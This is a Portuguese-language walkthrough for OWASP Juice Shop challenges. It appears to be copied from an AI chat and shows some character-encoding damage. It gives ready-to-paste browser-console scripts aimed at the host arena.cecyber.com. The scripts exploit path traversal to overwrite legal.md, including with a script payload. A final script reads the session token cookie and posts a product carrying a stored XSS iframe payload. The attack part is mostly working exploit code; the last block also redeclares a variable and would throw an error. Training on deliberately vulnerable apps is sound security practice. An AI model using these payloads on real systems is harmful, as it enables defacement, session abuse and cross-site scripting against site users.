Esse desafio **"Arbitrary File Write ‚Äì Overwrite the Legal Information file"** √© um dos desafios do **OWASP Juice Shop**.
Ele explora uma vulnerabilidade de **Path Traversal + Arbitrary File Write**, permitindo sobrescrever arquivos do servidor.

---

### üìå Como funciona o ataque?

No Juice Shop, h√° um endpoint vulner√°vel em **`/ftp`** ou em rotas relacionadas a upload.
Se a aplica√ß√£o n√£o valida corretamente o caminho do arquivo, √© poss√≠vel enviar algo como:

```
../../ftp/legal.md
```

E sobrescrever o arquivo **`legal.md`**, que √© exibido na p√°gina de **Legal Information**.

---

### üìñ Passos para resolver (em ambiente Juice Shop):

1. **Acesse a funcionalidade de upload**
   V√° at√© a p√°gina de **complaints** ou outra funcionalidade que aceite upload de arquivos.

2. **Intercepte a requisi√ß√£o (Burp/ZAP)**
   No campo do nome do arquivo (ou par√¢metro JSON com o caminho), troque por algo como:

   ```
   ../../ftp/legal.md
   ```

3. **Envie um arquivo Markdown personalizado**
   O arquivo deve conter texto (por exemplo `Hacked by ...`) para sobrescrever o conte√∫do legal.

4. **Acesse a p√°gina Legal Information**
   O conte√∫do que voc√™ enviou ser√° exibido.

---

### üîπ OWASP Top 10 relacionado

‚úÖ **A5:2021 ‚Äì Security Misconfiguration**
‚úÖ **A1:2021 ‚Äì Broken Access Control**
‚úÖ **A3:2021 ‚Äì Injection (Path Traversal)**






-------

### üìå Exemplo em JavaScript (executar no console do navegador)

```js
const formData = new FormData();

// Conte√∫do do arquivo que vai sobrescrever legal.md
const conteudo = "# ‚ö† P√°gina Alterada\n\nEste arquivo foi sobrescrito via Path Traversal!";
const arquivo = new File([conteudo], "../../ftp/legal.md", { type: "text/markdown" });

// Adiciona o arquivo no FormData
formData.append("file", arquivo);

// Faz a requisi√ß√£o POST para o endpoint de upload
fetch("https://arena.cecyber.com/file-upload", {
  method: "POST",
  body: formData
})
.then(res => res.text())
.then(console.log)
.catch(console.error);
```

---

### üîπ Como usar

1. Abra o site (`https://arena.cecyber.com`).
2. Aperte `F12` ‚Üí Aba **Console**.
3. Cole o c√≥digo acima e pressione **Enter**.
4. Depois, acesse **[https://arena.cecyber.com/ftp/legal.md](https://arena.cecyber.com/ftp/legal.md)** para verificar se o conte√∫do foi sobrescrito.

---

üîπ **IMPORTANTE:**
O nome do campo (`file`) e a URL (`/file-upload`) precisam ser iguais aos usados no upload real do site.
Se o site usar outro campo (ex: `complaintFile` ou `image`), √© s√≥ alterar no `formData.append("file", arquivo)`.


Sim! Se o sistema for vulner√°vel a **Path Traversal no upload**, d√° para alterar o **conte√∫do** ou at√© **substituir o arquivo**.

### ‚úÖ Para **alterar o texto dentro do arquivo**

Voc√™ pode criar um novo conte√∫do e salvar com o mesmo nome (`../../ftp/legal.md`) para sobrescrever:

```js
const novoConteudo = `
# Novo Legal.md
Este arquivo foi sobrescrito com novo conte√∫do!
`;

// Cria um arquivo com o mesmo nome do legal.md, mas usando path traversal
const arquivo = new File([novoConteudo], "../../ftp/legal.md", { type: "text/markdown" });

const formData = new FormData();
formData.append("file", arquivo);

fetch("https://arena.cecyber.com/file-upload", {
  method: "POST",
  body: formData
})
.then(res => res.text())
.then(console.log)
.catch(console.error);
```

---

### ‚úÖ Para **trocar por outro arquivo (ex: imagem ou script)**

Basta alterar o tipo (`type`) e o conte√∫do:

```js
const conteudoMalicioso = "<script>alert('Arquivo modificado!')</script>";

const arquivo = new File([conteudoMalicioso], "../../ftp/legal.md", { type: "text/html" });

const formData = new FormData();
formData.append("file", arquivo);

fetch("https://arena.cecyber.com/file-upload", {
  method: "POST",
  body: formData
})
.then(res => res.text())
.then(console.log)
.catch(console.error);
```

---

üìå **O que muda:**
‚úÖ Se o backend n√£o sanitiza o nome do arquivo, o `../../ftp/legal.md` faz **Path Traversal** e sobrescreve o arquivo real.
‚úÖ Se o backend aceita qualquer extens√£o, voc√™ consegue **alterar at√© o tipo do arquivo**.

‚ö†Ô∏è Isso √© exatamente a vulnerabilidade **Arbitrary File Write (OWASP A6: Security Misconfiguration)**.



```js 

function getToken() {
  const cookies = document.cookie.split("; ");
  const tokenCookie = cookies.find(c => c.startsWith("token="));
  if (!tokenCookie) {
    console.error("‚ö†Ô∏è Nenhum token encontrado!");
    return null;
  }
  return tokenCookie.split("=")[1];
}

// üîπ Uso
let token = getToken();
console.log("üîë Token atual:", token);


let token = getToken();

if (token) {
  fetch("https://arena.cecyber.com/api/Products", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${token}`
    },
    body: JSON.stringify({
      name: "XSS",
      description: '<iframe src="javascript:alert(`xss`)">',
      price: 47.11,
      deluxePrice: 47.11,
      image: "Base_CompTIA_PenTest.png"
    })
  })
  .then(async res => {
    const text = await res.text();
    try {
      console.log("‚úÖ JSON:", JSON.parse(text));
    } catch {
      console.log("‚ùå Resposta n√£o √© JSON:", text);
    }
  });
}


```